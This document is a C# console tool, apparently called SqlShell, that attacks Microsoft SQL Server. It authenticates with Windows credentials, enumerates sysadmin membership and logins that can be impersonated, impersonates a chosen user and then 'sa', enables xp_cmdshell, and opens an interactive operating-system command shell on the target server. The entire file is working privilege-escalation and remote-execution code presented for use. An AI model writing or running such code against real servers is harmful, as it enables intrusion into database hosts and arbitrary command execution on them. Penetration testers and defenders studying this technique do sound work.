using System;
using System.IO;
using System.Text;
using System.Data.SqlClient;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SqlShell
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("[*] Enter target sql server: ");
            String sqlServer = Console.ReadLine();
            Console.Write("[*] Enter target database: ");
            String sqlDatabase = Console.ReadLine();
            String sqlConn = $"Server = {sqlServer}; Database = {sqlDatabase}; Integrated Security = True;";
            SqlConnection conn = new SqlConnection(sqlConn);

            try
            {
                conn.Open();
                Console.WriteLine("[+] Authentication successful");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failure");
                Environment.Exit(0);
            }

            Console.WriteLine("[!] Checking user privileges");
            String user = "select system_user;";
            SqlCommand cmd = new SqlCommand(user, conn);
            SqlDataReader read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Mapped to user: {read[0]}");
            read.Close();

            String pub = "select is_srvrolemember('public');";
            cmd = new SqlCommand(pub, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Int32 role = Int32.Parse(read[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of public role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of public role");
            }
            read.Close();

           String adm = "select is_srvrolemember('sysadmin');";
            cmd = new SqlCommand(adm, conn);
            read = cmd.ExecuteReader();
            read.Read();
            role = Int32.Parse(read[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a sysadmin");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a sysadmin");
            }
            read.Close();

            Console.WriteLine("[!] Checking for user impersonation");
            String query = "select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate';";
            cmd = new SqlCommand(query, conn);
            read = cmd.ExecuteReader();

            while (read.Read() == true)
            {
                Console.WriteLine($"[+] {read[0]} can be impersonated");
            }
            read.Close();

            Console.Write("[*] Would you like to attempt impersonation? [y/n]: ");
            String answer = Console.ReadLine();

            if (answer.ToLower() == "y")
            {
                try
                {
                    Console.Write("[*] Enter user to impersonate: ");
                    String target = Console.ReadLine();
                    Console.WriteLine($"[!] Attempting to impersonate {target}");
                    String runas = $"use msdb; execute as user = '{target}';";
                    cmd = new SqlCommand(runas, conn);
                    read = cmd.ExecuteReader();
                    read.Close();
                    Console.WriteLine("[+] Impersonation success!");
                    String check = "select system_user;";
                    cmd = new SqlCommand(check, conn);
                    read = cmd.ExecuteReader();
                    read.Read();
                    Console.WriteLine($"[+] Current user: {read[0]}");
                    read.Close();
                    Console.Write("[*] Would you like to attempt to enable xp_cmdshell? [y/n]: ");
                    answer = Console.ReadLine();

                    if (answer.ToLower() == "y")
                    {
                        try
                        {
                            String cwd = Directory.GetCurrentDirectory();
                            String impersonate = "execute as login = 'sa';";
                            String xp_cmdshell = "exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1; reconfigure;";

                            cmd = new SqlCommand(impersonate, conn);
                            read = cmd.ExecuteReader();
                            read.Close();

                            cmd = new SqlCommand(xp_cmdshell, conn);
                            read = cmd.ExecuteReader();
                            read.Close();

                            Console.WriteLine("[+] Entering new shell session");
                            Console.Write($"\nMSSQL {cwd}> ");
                            String command = Console.ReadLine();
                            String execCmd = $"exec xp_cmdshell '{command}';";
                            cmd = new SqlCommand(execCmd, conn);
                            read = cmd.ExecuteReader();
                            read.Read();
                            Console.WriteLine($"{read[0]}");
                            read.Close();

                            while (true)
                            {
                                Console.Write($"MSSQL {cwd}> ");
                                command = Console.ReadLine();
                                execCmd = $"exec xp_cmdshell '{command}';";
                                cmd = new SqlCommand(execCmd, conn);
                                read = cmd.ExecuteReader();
                                read.Read();
                                Console.WriteLine($"{read[0]}");
                                read.Close();

                                if (String.Equals(command, "exit"))
                                {
                                    Console.Clear();
                                    break;
                                }
                            }

                            conn.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.ToString());
                            conn.Close();
                            Environment.Exit(0);
                        }
                    }
                    else if (answer.ToLower() == "n")
                    {
                        conn.Close();
                        Environment.Exit(0);
                    }
                    else
                    {
                        Console.WriteLine("[-] Invalid selection!");
                        conn.Close();
                        Environment.Exit(0);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                    conn.Close();
                    Environment.Exit(0);
                }
            }
            else if (answer.ToLower() == "n")
            {
                conn.Close();
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[-] Invalid selection!");
                conn.Close();
                Environment.Exit(0);
            }
            conn.Close();
        }
    }
}
